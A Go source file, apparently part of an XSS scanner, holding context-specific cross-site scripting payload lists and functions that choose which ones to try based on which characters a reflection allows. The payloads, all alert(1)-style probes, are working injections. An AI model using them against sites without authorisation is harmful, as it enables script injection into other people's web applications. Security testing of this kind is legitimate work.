package xss

import "strings"

// Payload sets for each context type
var contextPayloads = map[ContextType][]string{
	ContextHTMLBody: {
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<svg><script>alert(1)</script></svg>",
		"<script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<iframe src=javascript:alert(1)>",
	},
	ContextHTMLAttributeQuoted: {
		"\" onload=alert(1) x=\"",
		"' onload=alert(1) x='",
		"\"><img src=x onerror=alert(1)>",
		"\" autofocus onfocus=alert(1) x=\"",
		"\"><svg onload=alert(1)>",
	},
	ContextHTMLAttributeUnquoted: {
		"onload=alert(1) x=",
		"><img src=x onerror=alert(1)>",
		"autofocus onfocus=alert(1) x=",
	},
	ContextScriptString: {
		"';alert(1);//",
		"\";alert(1);//",
		"</script><script>alert(1)</script>",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
	},
	ContextScriptBlock: {
		"alert(1)",
		";alert(1);//",
		";alert(1);",
	},
	ContextScriptTemplateLiteral: {
		"${alert(1)}",
		"`+alert(1)+`",
		"${alert`1`}",
	},
	ContextHTMLComment: {
		"--><img src=x onerror=alert(1)>",
		"--!><img src=x onerror=alert(1)>",
	},
	ContextStyleBlock: {
		"</style><script>alert(1)</script>",
		"</style><img src=x onerror=alert(1)>",
	},
	ContextURLAttribute: {
		"javascript:alert(1)",
		"javascript:alert`1`",
		"javascript:alert(document.domain)",
		"data:text/html,<script>alert(1)</script>",
	},
}

// SelectPayloads returns appropriate payloads for the given context
func SelectPayloads(reflection ReflectionInfo, params map[string]interface{}) []string {
	// Get base payloads for context
	payloads := contextPayloads[reflection.Context]
	if payloads == nil {
		return nil
	}

	// Filter by available characters
	filtered := filterByAvailableChars(payloads, reflection.AvailableChars, reflection.Context)

	// Limit number of attempts
	maxAttempts := 3
	if max, ok := params["max_verification_attempts"].(int); ok && max > 0 {
		maxAttempts = max
	}

	if len(filtered) > maxAttempts {
		return filtered[:maxAttempts]
	}

	return filtered
}

func filterByAvailableChars(payloads []string, chars CharacterSet, context ContextType) []string {
	var result []string

	for _, payload := range payloads {
		if canUsePayload(payload, chars, context) {
			result = append(result, payload)
		}
	}

	return result
}

func canUsePayload(payload string, chars CharacterSet, context ContextType) bool {
	// Check if payload only uses available characters

	// For HTML body context, always need < and > for tag injection
	if context == ContextHTMLBody {
		if !chars.LessThan || !chars.GreaterThan {
			return false
		}
	}

	// For any payload containing < or >, verify those chars are available
	if strings.Contains(payload, "<") && !chars.LessThan {
		return false
	}
	if strings.Contains(payload, ">") && !chars.GreaterThan {
		return false
	}

	// For attribute breakout with quotes
	if strings.Contains(payload, "\"") && !chars.DoubleQuote {
		return false
	}
	if strings.Contains(payload, "'") && !chars.SingleQuote {
		return false
	}

	// For script/style tag closing
	if strings.Contains(payload, "/") && !chars.Slash {
		return false
	}

	// For template literals
	if strings.Contains(payload, "`") && !chars.Backtick {
		return false
	}

	return true
}
